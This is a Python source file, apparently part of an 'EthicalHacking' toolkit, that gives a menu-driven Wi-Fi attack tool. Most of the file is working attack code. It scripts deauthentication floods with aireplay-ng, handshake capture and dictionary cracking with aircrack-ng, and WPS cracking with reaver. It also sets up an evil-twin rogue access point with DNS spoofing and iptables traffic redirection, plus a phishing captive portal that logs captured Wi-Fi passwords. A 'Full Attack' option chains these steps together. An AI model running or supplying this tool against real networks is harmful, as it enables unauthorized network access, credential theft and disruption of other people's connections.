import subprocess
import os
from utils import string_format, run_task, check_var


def reloadConf(resultsPath):
    file = open(resultsPath + "saved.conf", "r")
    dict = {}
    for line in file.read().splitlines():
        string = line.split("=")
        dict.update({string[0]: string[1].strip()})
    adapter = dict["adapter"]
    wifi_bssid = dict["wifi_bssid"]
    channel = dict["channel"]
    device_bssid = dict["device_bssid"]
    capfile = dict["capfile"]
    ap_adapter = dict["ap_adapter"]
    ssid = dict["ssid"]
    ap_channel = dict["ap_channel"]
    return (
        adapter,
        wifi_bssid,
        channel,
        device_bssid,
        capfile,
        ap_adapter,
        ssid,
        ap_channel,
    )


def deAuthAttack(wifi_bssid, adapter):
    if check_var([wifi_bssid, adapter]):
        device_bssid = str(input("Device BSSID [blank all]: "))
        if device_bssid:
            run_task.newTerminal(
                [
                    "aireplay-ng",
                    "-0",
                    "0",
                    "-a",
                    wifi_bssid,
                    "-c",
                    device_bssid,
                    adapter,
                ]
            )
        else:
            run_task.newTerminal(
                [
                    "aireplay-ng",
                    "-0",
                    "0",
                    "-a",
                    wifi_bssid,
                    adapter,
                ]
            )


def rogueAPAttack(ssid, ap_adapter, ap_channel, resultsPath):
    if check_var([ssid, ap_adapter, ap_channel]):
        out_interface = str(input("Output interface to masquerade traffic: "))
        dnsmasqConf = open(resultsPath + "dnsmasq.conf", "w")
        # Make cfgs
        dnsmasqConf.write(
            f"""interface={ap_adapter}
dhcp-range=192.168.2.2,192.168.2.230,255.255.255.0,12h
dhcp-option=3,192.168.2.1
dhcp-option=6,192.168.2.1
no-hosts
addn-hosts={resultsPath}hosts
no-resolv
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address=192.168.2.1"""
        )
        dnsmasqConf.close()
        hostapdConf = open(resultsPath + "hostapd.conf", "w")
        hostapdConf.write(
            f"""interface={ap_adapter}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={ap_channel}
macaddr_acl=0
ignore_broadcast_ssid=0"""
        )
        hostapdConf.close()
        # Start AP
        run_task.newTerminal(
            [
                "hostapd",
                resultsPath + "hostapd.conf",
            ]
        )
        # Start DNS spoof & DHCP
        run_task.newTerminal(
            [
                "dnsmasq",
                "-C",
                resultsPath + "dnsmasq.conf",
                "-d",
            ]
        )
        # Set Firewall rules and network
        run_task.normalShell(
            f"ifconfig {ap_adapter} up 192.168.2.1 netmask 255.255.255.0;\
                        route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1;\
                        iptables-save > {resultsPath}iptables.bkp;\
                        iptables --flush;\
                        iptables --table nat --flush;\
                        iptables --delete-chain;\
                        iptables --table nat --delete-chain;\
                        iptables --table nat --append POSTROUTING --out-interface={out_interface} -j MASQUERADE;\
                        iptables --append FORWARD --in-interface {ap_adapter} -j ACCEPT;\
                        echo 1 > /proc/sys/net/ipv4/ip_forward;\
                        iptables -A INPUT -p tcp --dport 443 -j ACCEPT;\
                        iptables -A INPUT -p tcp --dport 80 -j ACCEPT;\
                        iptables -A INPUT -p udp --dport 53 -j ACCEPT;\
                        iptables -A INPUT -p udp --dport 67 -j ACCEPT;\
                        iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.2.1:80;\
                        iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.2.1:443"
        )
        # CP tmp Hosts file to be used with DNS spoof
        run_task.normalShell(f"cp ./EthicalHacking/Wifi/hosts {resultsPath}")


def cpAttack(ssid, resultsPath, capfile):
    if check_var([ssid]):
        # Copy cfgs to tmp folder
        run_task.normalCapture(
            [
                "cp",
                "-Rv",
                "./EthicalHacking/Wifi/captive_portal",
                resultsPath,
            ]
        )
        run_task.normalCapture(["chmod", "-R", "777", resultsPath + "captive_portal"])

        print(string_format.info("\nPortals Availables"))
        run_task.normalShell(
            f"ls -l {resultsPath}captive_portal/portals | grep '^d' | cut -d ' ' -f10"
        )
        portal = str(input("\nSelect a portal name: "))

        run_task.normalCapture(
            [
                "sed",
                "-i",
                f"s/WIFI_SSID/{ssid}/g",
                f"{resultsPath}captive_portal/portals/{portal}/index.html",
            ]
        )

        run_task.normalCapture(
            [
                "cp",
                "./EthicalHacking/Wifi/captive_portal/check.php",
                f"{resultsPath}captive_portal/portals/{portal}",
            ]
        )

        run_task.normalCapture(
            [
                "sed",
                "-i",
                f"s+CAP_FILE_PATH+{capfile}+g",
                f"{resultsPath}captive_portal/portals/{portal}/check.php",
            ]
        )

        run_task.normalCapture(
            [
                "sed",
                "-i",
                f"s/WIFI_SSID/{ssid}/g",
                f"{resultsPath}captive_portal/portals/{portal}/check.php",
            ]
        )

        run_task.normalCapture(
            [
                "sed",
                "-i",
                f"s/PORTAL_ROOT/{portal}/g",
                f"{resultsPath}captive_portal/lighttpd.conf",
            ]
        )
        # Start Web server
        run_task.newTerminal(
            [
                "lighttpd",
                "-D",
                "-f",
                resultsPath + "captive_portal/lighttpd.conf",
            ]
        )
        # Monitor password hit
        run_task.newTerminal(["tail", "-f", resultsPath + "captive_portal/hit.txt"])


def main(resultsPath):
    resultsPath = resultsPath + "Wifi/"
    os.makedirs(resultsPath, exist_ok=True)

    adapter = wifi_bssid = channel = device_bssid = capfile = ap_adapter = ssid = (
        ap_channel
    ) = ""

    if os.path.isfile(resultsPath + "saved.conf"):
        reload = str(input("Saved config exists. Do you want to reload it? [y/n]: "))
        subprocess.run(["clear"], shell=True)
        if reload == "Y" or reload == "y":
            (
                adapter,
                wifi_bssid,
                channel,
                device_bssid,
                capfile,
                ap_adapter,
                ssid,
                ap_channel,
            ) = reloadConf(resultsPath)

    while True:
        print(string_format.title("WIFI HACKING"))

        print(
            string_format.info("\nALL RESULTS WILL BE STORED IN: ")
            + string_format.success(resultsPath)
        )
        print(string_format.info("\nCurrent variables values:\n"))
        print("Monitor Adapter:", string_format.text(adapter))
        print("AP Adapter:", string_format.text(ap_adapter))
        print("Wifi BSSID:", string_format.text(wifi_bssid))
        print("Wifi SSID:", string_format.text(ssid))
        print("Wifi channel:", string_format.text(channel))
        print("AP channel:", string_format.text(ap_channel))
        print("Device BSSID:", string_format.text(device_bssid))
        print("Default CAP File:", string_format.text(capfile), "\n")
        try:
            operation = int(
                input(
                    """
[1] List network Adapters
[2] Set wifi adapter to monitor mode [REQUIRED]
[3] Show available Wifis
[4] Monitor selected Wifi
[5] Send DeAuth Atack to BSSID
[6] Password Crack [Aircrack-ng dictionary with CAP File]
[7] Show all WPS enabled APs
[8] WPS Crack
[9] Set Rogue AP
[10] Create Captive Portal
[11] Full Attack [Rogue AP + Captive Portal + DeAuth]
[97] Manually set variables
[98] Custom command (SHELL)
[99] Exit

Select operation: """
                )
            )
        except:
            operation = 0
        print("\n")
        match operation:
            # Interface list
            case 1:
                run_task.normal(["iwconfig"])

            # Set wifi adapter to monitor mode
            case 2:
                adapter = str(input("Adapter name: "))
                print("Setting up", adapter, "to monitor mode")
                run_task.normal(["airmon-ng", "start", adapter])
                run_task.normal(["iwconfig"])
                print(adapter, "set to monitor mode")
                adapter = adapter + "mon"

            # Show available wifis
            case 3:
                if check_var([adapter]):
                    run_task.normal(
                        [
                            "airodump-ng",
                            "--band",
                            "abg",
                            adapter,
                            "-w",
                            resultsPath + "availableWifis",
                        ]
                    )

            # Monitor selected wifi
            case 4:
                channel = str(input("Channel number: "))
                wifi_bssid = str(input("Wifi BSSID: "))
                run_task.newTerminal(
                    [
                        "airodump-ng",
                        "--band",
                        "abg",
                        "-c",
                        channel,
                        "--bssid",
                        wifi_bssid,
                        "-w",
                        resultsPath + wifi_bssid + "_scan",
                        adapter,
                    ]
                )
                capfile = resultsPath + wifi_bssid + "_scan-01.cap"

            # Send DeAuth Atack
            case 5:
                deAuthAttack(wifi_bssid, adapter)

            # Password Crack
            case 6:
                wordfile = str(input("Path to wordfile: "))
                tempcap = str(input("Path to CAP file [blank default]: "))
                if tempcap:
                    capfile = tempcap
                wpa_type = int(input("WEP (1) or WPA-PSK (2): "))
                if wpa_type == 1:
                    run_task.normal(
                        [
                            "aircrack-ng",
                            "-a1",
                            "-b",
                            wifi_bssid,
                            "-w",
                            wordfile,
                            capfile,
                        ]
                    )
                elif wpa_type == 2:
                    run_task.normal(
                        [
                            "aircrack-ng",
                            "-a2",
                            "-b",
                            wifi_bssid,
                            "-w",
                            wordfile,
                            capfile,
                        ]
                    )
                else:
                    print("Invalid type")

            # Show WPS
            case 7:
                if check_var([adapter]):
                    run_task.newTerminal(
                        [
                            "wash",
                            "-i",
                            adapter,
                            "-O",
                            resultsPath + "WPS_scan",
                        ]
                    )

            # WPS Crack
            case 8:
                if check_var([adapter, wifi_bssid, channel]):
                    run_task.normal(
                        [
                            "reaver",
                            "-i",
                            adapter,
                            "-b",
                            wifi_bssid,
                            "-c",
                            channel,
                            "-O",
                            resultsPath + "_WPSCrack",
                        ]
                    )

            # Rogue AP
            case 9:
                rogueAPAttack(ssid, ap_adapter, ap_channel, resultsPath)

            # Captive Portal
            case 10:
                cpAttack(ssid, resultsPath, capfile)

            # Full Attack RogueAP + Captive Portal + DeAuth
            case 11:
                rogueAPAttack(ssid, ap_adapter, ap_channel, resultsPath)
                cpAttack(ssid, resultsPath, capfile)
                deAuthAttack(wifi_bssid, adapter)

            # Change variables
            case 97:
                print(string_format.warning("Empty field = current value \n"))
                adapter = str(input("Monitor Adapter: ") or adapter)
                ap_adapter = str(input("AP Adapter: ") or ap_adapter)
                wifi_bssid = str(input("Wifi BSSID: ") or wifi_bssid)
                ssid = str(input("Wifi SSID: ") or ssid)
                channel = str(input("Wifi channel: ") or channel)
                ap_channel = str(input("AP channel: ") or ap_channel)
                device_bssid = str(input("Device BSSID: ") or device_bssid)
                capfile = str(input("CAP File path: ") or capfile)

            # Custom shell
            case 98:
                print("THIS SECTION DOESN'T MAKE ANY LOG BY DEFAULT")
                print("YOU NEED TO MAKE YOUR OWN LOG\n")
                command = str(input("Command: "))
                run_task.normalShell(command)

            # Exit
            case 99:
                break

            case _:
                print("Invalid option")
        saved_conf = open(resultsPath + "saved.conf", "w")
        saved_conf.write(
            f"adapter={adapter}\
            \nap_adapter={ap_adapter}\
            \nwifi_bssid={wifi_bssid}\
            \nssid={ssid}\
            \nchannel={channel}\
            \nap_channel={ap_channel}\
            \ndevice_bssid={device_bssid}\
            \ncapfile={capfile}"
        )
        saved_conf.close()
        input("\nPress enter to continue ")
        subprocess.run(["clear"], shell=True)
